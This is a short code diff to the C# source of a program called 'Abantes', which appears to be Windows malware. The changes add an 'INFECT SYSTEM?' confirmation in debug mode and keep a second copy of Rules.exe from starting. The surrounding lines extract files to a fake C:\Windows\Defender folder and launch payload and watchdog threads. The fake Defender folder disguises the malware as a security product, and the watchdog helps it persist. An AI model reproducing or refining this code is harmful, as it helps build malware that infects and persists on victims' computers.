@@ -30,7 +30,8 @@ namespace Abantes
 
             if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
 
-            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null) { } else { MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, 0); Mode = 1; }
+            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null)
+            { } else { if (MessageBox.Show("INFECT SYSTEM?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No) { Environment.Exit(0); } MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, 0); Mode = 1; }
 
             RegistryKey editKey;
             string extractPath = @"C:\Windows\Defender";
@@ -391,7 +392,10 @@ namespace Abantes
             }
             else
             {
-                Others.StartProcess(extractPath + @"\Rules.exe", "");
+                if (Process.GetProcessesByName("Rules").Length == 0)
+                {
+                    Others.StartProcess(extractPath + @"\Rules.exe", "");
+                }
                 Thread.Sleep(1000);
                 Thread normalThread = new Thread(new ThreadStart(Threads.MainPayloadThread));
                 Thread watchdogThread = new Thread(new ThreadStart(Threads.WatchDogThread));
